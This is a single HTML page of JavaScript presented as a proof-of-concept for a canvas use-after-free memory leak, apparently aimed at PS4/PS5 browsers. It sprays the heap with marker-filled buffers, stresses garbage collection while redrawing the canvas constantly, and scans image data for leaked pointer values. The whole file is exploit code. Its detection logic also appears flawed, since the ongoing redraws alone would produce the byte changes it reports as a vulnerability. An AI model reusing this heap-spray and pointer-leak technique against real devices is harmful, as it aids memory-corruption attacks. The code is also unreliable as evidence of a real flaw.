<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Canvas UAF Leak PoC (PS4/PS5?)</title>
    <style>
        #trigger {
            margin: 20px 0;
            padding: 12px;
            font-size: 18px;
            cursor: pointer;
        }
        #status {
            margin-top: 10px;
            font-weight: bold;
            color: darkred;
        }
        #console {
            margin-top: 10px;
            white-space: pre-wrap;
            font-family: monospace;
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid #ccc;
            padding: 10px;
        }
        #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <h1>Canvas UAF Leak PoC</h1>
    <p>Click to test UAF and leak address. Reduced crash risk.</p>
    <button id="trigger">TEST UAF</button>
    <div id="status">Idle...</div>
    <div id="console"></div>
    <canvas id="canvas" width="512" height="512"></canvas>
    <script>
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const status = document.getElementById('status');
        const consoleDiv = document.getElementById('console');
        let attemptCount = 0;
        const imageDataSize = 512 * 512 * 4; // 1MB

        function log(msg) {
            consoleDiv.append(msg + '\n');
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
        }

        function stressGC() {
            for (let i = 0; i < 500; i++) {
                new ArrayBuffer(1024 * 1024);
            }
            for (let i = 0; i < 100; i++) {
                new ArrayBuffer(2 * 1024 * 1024);
            }
        }

        function drawOnCanvas() {
            ctx.fillStyle = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.beginPath();
            ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, 50, 0, 2 * Math.PI);
            ctx.fill();
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            for (let i = 0; i < imageData.data.length; i++) {
                imageData.data[i] = Math.random() * 255;
            }
            ctx.putImageData(imageData, 0, 0);
        }

        function sprayHeap() {
            const arrays = [];
            for (let i = 0; i < 1000; i++) { // Reduced from 5000
                const buf = new ArrayBuffer(imageDataSize);
                const view = new DataView(buf);
                for (let j = 0; j < buf.byteLength; j += 16) {
                    view.setUint32(j, 0x41424344, true); // ABCD pattern
                    view.setUint32(j + 4, 0x12345678, true); // Fake ptr low
                    view.setUint32(j + 8, 0x87654321, true); // Fake ptr high
                    view.setUint32(j + 12, i, true); // Index
                }
                arrays.push(buf);
            }
            return arrays;
        }

        function checkImageDataUAF(imageData) {
            const original = new Uint8Array(imageData.data.buffer);
            const originalCopy = new Uint8Array(original);
            ctx.putImageData(imageData, 0, 0);
            try {
                const current = new Uint8Array(ctx.getImageData(0, 0, canvas.width, canvas.height).data.buffer);
                let differenceCount = 0;
                const ranges = [];
                let currentRange = null;

                // Compare first 4096 bytes
                for (let i = 0; i < Math.min(original.length, 4096); i++) {
                    try {
                        if (originalCopy[i] !== current[i]) {
                            differenceCount++;
                            if (!currentRange || currentRange.newValue !== current[i]) {
                                if (currentRange) {
                                    ranges.push(currentRange);
                                }
                                currentRange = {
                                    start: i,
                                    end: i,
                                    original: originalCopy[i],
                                    newValue: current[i]
                                };
                            } else {
                                currentRange.end = i;
                            }
                        } else if (currentRange) {
                            ranges.push(currentRange);
                            currentRange = null;
                        }
                    } catch (e) {
                        return { detected: true, differenceCount, ranges, error: `Access error at offset ${i}: ${e.message}` };
                    }
                }
                if (currentRange) {
                    ranges.push(currentRange);
                }

                // Check for sprayed pattern
                let leak = null;
                try {
                    const currentView = new DataView(current.buffer);
                    for (let i = 0; i < Math.min(current.buffer.byteLength - 16, 4096); i += 4) {
                        if (currentView.getUint32(i, true) === 0x41424344) {
                            const lo = currentView.getUint32(i + 4, true);
                            const hi = currentView.getUint32(i + 8, true);
                            const idx = currentView.getUint32(i + 12, true);
                            if (lo !== 0x12345678 || hi !== 0x87654321) {
                                leak = {
                                    offset: i,
                                    pattern: 'ABCD',
                                    ptr: `0x${hi.toString(16).padStart(8, '0')}${lo.toString(16).padStart(8, '0')}`,
                                    index: idx
                                };
                                break;
                            }
                        }
                    }
                } catch (e) {
                    return { detected: true, differenceCount, ranges, error: `Leak check error: ${e.message}` };
                }

                return { detected: differenceCount > 0, differenceCount, ranges, leak };
            } catch (e) {
                return { detected: true, differenceCount: 0, ranges: [], error: e.message };
            }
        }

        async function detectUAF() {
            attemptCount++;
            status.textContent = `Attempt ${attemptCount} in progress...`;
            log(`Attempt ${attemptCount} started`);

            try {
                // Create reference ImageData
                const refImageData = ctx.createImageData(512, 512);
                const refView = new Uint8Array(refImageData.data.buffer);
                for (let i = 0; i < refView.length; i++) {
                    refView[i] = 0x46;
                }

                // Spray heap
                log('Spraying heap with 1000 buffers...');
                const sprayed = sprayHeap();

                // Intensive drawing
                const drawInterval = setInterval(drawOnCanvas, 1); // Restored

                // Check for UAF
                setTimeout(async () => {
                    const result = checkImageDataUAF(refImageData);
                    clearInterval(drawInterval);

                    if (result.detected) {
                        status.textContent = 'UAF detected!';
                        log('UAF detected!');
                        if (result.error) {
                            status.textContent += `\nError: ${result.error}`;
                            log(`Error: ${result.error}`);
                        } else if (result.differenceCount > 0) {
                            status.textContent += `\n${result.differenceCount} bytes changed`;
                            log(`${result.differenceCount} bytes changed`);
                            if (result.ranges.length > 0) {
                                log('Changed ranges:');
                                for (const range of result.ranges) {
                                    log(`Offsets: ${range.start}-${range.end}, Original: 0x${range.original.toString(16).padStart(2, '0')}, New: 0x${range.newValue.toString(16).padStart(2, '0')}`);
                                }
                            }
                            if (result.leak) {
                                status.textContent += `\nLeak at offset ${result.leak.offset}!`;
                                log(`Leak at offset ${result.leak.offset}:`);
                                log(`Pattern: ${result.leak.pattern}`);
                                log(`Ptr: ${result.leak.ptr}`);
                                log(`Buffer index: ${result.leak.index}`);
                            }
                        } else {
                            status.textContent += '\nUAF occurred, no bytes checked';
                            log('UAF occurred, no bytes checked');
                        }
                    } else {
                        stressGC();
                        await new Promise(resolve => setTimeout(resolve, 10));
                        const secondResult = checkImageDataUAF(refImageData);
                        if (secondResult.detected) {
                            status.textContent = 'UAF detected after GC!';
                            log('UAF detected after GC!');
                            if (secondResult.error) {
                                status.textContent += `\nError: ${secondResult.error}`;
                                log(`Error: ${secondResult.error}`);
                            } else if (secondResult.differenceCount > 0) {
                                status.textContent += `\n${secondResult.differenceCount} bytes changed`;
                                log(`${secondResult.differenceCount} bytes changed`);
                                if (secondResult.ranges.length > 0) {
                                    log('Changed ranges:');
                                    for (const range of secondResult.ranges) {
                                        log(`Offsets: ${range.start}-${range.end}, Original: 0x${range.original.toString(16).padStart(2, '0')}, New: 0x${range.newValue.toString(16).padStart(2, '0')}`);
                                    }
                                }
                                if (secondResult.leak) {
                                    status.textContent += `\nLeak at offset ${secondResult.leak.offset}!`;
                                    log(`Leak at offset ${secondResult.leak.offset}:`);
                                    log(`Pattern: ${secondResult.leak.pattern}`);
                                    log(`Ptr: ${secondResult.leak.ptr}`);
                                    log(`Buffer index: ${secondResult.leak.index}`);
                                }
                            } else {
                                status.textContent += '\nUAF occurred, no bytes checked';
                                log('UAF occurred, no bytes checked');
                            }
                        } else {
                            status.textContent = 'No UAF detected';
                            log('No UAF detected');
                        }
                    }
                }, 300); // Increased timeout
            } catch (err) {
                status.textContent = `Failed: ${err.message}`;
                log(`Error: ${err.message}`);
            }
        }

        document.getElementById('trigger').addEventListener('click', async () => {
            try {
                await detectUAF();
            } catch (err) {
                status.textContent = `Failed: ${err.message}`;
                log(`Error: ${err.message}`);
            }
        });
    </script>
</body>
</html>
